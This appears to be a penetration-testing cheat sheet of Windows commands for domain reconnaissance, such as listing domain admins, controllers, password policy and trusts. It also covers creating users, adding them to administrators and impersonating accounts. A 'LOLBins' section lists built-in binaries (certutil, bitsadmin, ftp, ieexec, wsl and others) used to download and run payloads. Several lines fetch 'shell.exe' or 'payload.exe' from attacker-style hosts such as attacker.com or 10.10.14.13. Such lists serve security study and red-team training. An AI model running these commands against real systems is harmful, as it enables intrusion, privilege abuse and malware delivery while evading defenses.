---
title: Basic commands
description: Usefull commands to be used both on Powershell and CMD prompts
position: 3
---

## Recon

### Domain info

```powershell
echo %USERDOMAIN% #Get domain name
echo %USERDNSDOMAIN% #Get domain name
echo %logonserver% #Get name of the domain controller
set logonserver #Get name of the domain controller
set log #Get name of the domain controller
net groups /domain #List of domain groups
net group "domain computers" /domain #List of PCs connected to the domain
net group "{{ domain-group group name }}" /domain #List of PCs connected to the domain
net view /domain #Lis of PCs of the domain
nltest /dclist:<DOMAIN> #List domain controllers
net group "Domain Controllers" /domain #List PC accounts of domains controllers
net group "Domain Admins" /domain #List users with domain admin privileges
net localgroup administrators /domain #List uses that belongs to the administrators group inside the domain (the grup "Domain Admins" is included here)
net user /domain #List all users of the domain
net user {{ username username }} /domain #Get information about that user
net accounts /domain #Password and lockout policy
nltest /domain_trust #Mapping of the trust relationships.
gpresult /V # Get current policy applied
```

### Users

```powershell
whoami /all #All info about me, take a look at the enabled tokens
whoami /priv #Show only privileges
net users #All users
dir /b /ad "C:\Users"
net user %username% #Info about a user (me)
net accounts #Information about password requirements
qwinsta #Anyone else logged in?
net user /add {{ username username }} {{ password password }} #Create user

#Lauch new cmd.exe with new creds (to impersonate in network) - The password will be prompted
runas /netonly /user {{ domain htb.local }}\{{ username username }} "cmd.exe"

#Check current logon session as administrator using logonsessions from sysinternals
logonsessions.exe
logonsessions64.exe
```

### Groups

```powershell
#Local
net localgroup #All available groups
net localgroup Administrators #Info about a group (admins)
net localgroup administrators {{ username username }} /add #Add user to administrators

#Domain
net group /domain #Info about domain groups
net group /domain "{{ domain-group Group Name }}" #Users that belongs to the group
```

### Shares

```powershell
net view #Get a list of computers
net view /all /domain {{ domain htb.local }} #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

## LOLBins

### Download files

- `Bitsadmin.exe`:

```powershell
bitsadmin /create 1 bitsadmin /addfile 1 {{ url https://live.sysinternals.com/autoruns.exe }} {{ output c:\data\playfolder\autoruns.exe }} bitsadmin /RESUME 1 bitsadmin /complete 1
```

- `CertReq.exe`:

```powershell
CertReq -Post -config {{ url https://example.org/ }} c:\windows\win.ini {{ output output.txt }}
```

- `Certutil.exe`:

```powershell
certutil.exe -urlcache -split -f "{{ url http://10.10.14.13:8000/shell.exe }}" {{ output s.exe }}
```

- `Desktopimgdownldr.exe`:

```powershell
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
```

- `Diantz.exe`:

```powershell
diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab
```

- `Esentutl.exe`:

```powershell
esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o
```

- `Expand.exe`:

```powershell
expand \\webdav\folder\file.bat c:\ADS\file.bat
```

- `Extrac32.exe`:

```powershell
extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
```

- `Findstr.exe`:

```powershell
findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe
```

- `Ftp.exe`:

```powershell
cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
```

- `GfxDownloadWrapper.exe`:

```powershell
C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "URL" "DESTINATION FILE"
```

- `Hh.exe`:

```powershell
HH.exe http://some.url/script.ps1
```

- `Ieexec.exe`:

```powershell
ieexec.exe http://x.x.x.x:8080/bypass.exe
```

- `Makecab.exe`:

```powershell
makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
```

- `MpCmdRun.exe`:

```powershell
MpCmdRun.exe -DownloadFile -url <URL> -path <path> //Windows Defender executable
```

- `Replace.exe`:

```powershell
replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
```

- `Excel.exe`:

```powershell
Excel.exe http://192.168.1.10/TeamsAddinLoader.dll
```

- `Powerpnt.exe`:

```powershell
Powerpnt.exe "http://192.168.1.10/TeamsAddinLoader.dll"
```

- `Squirrel.exe`:

```powershell
squirrel.exe --download [url to package]
```

- `Update.exe`:

```powershell
Update.exe --download [url to package]
```

- `Winword.exe`:

```powershell
winword.exe "http://192.168.1.10/TeamsAddinLoader.dll"
```

- `Wsl.exe`:

```powershell
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
```
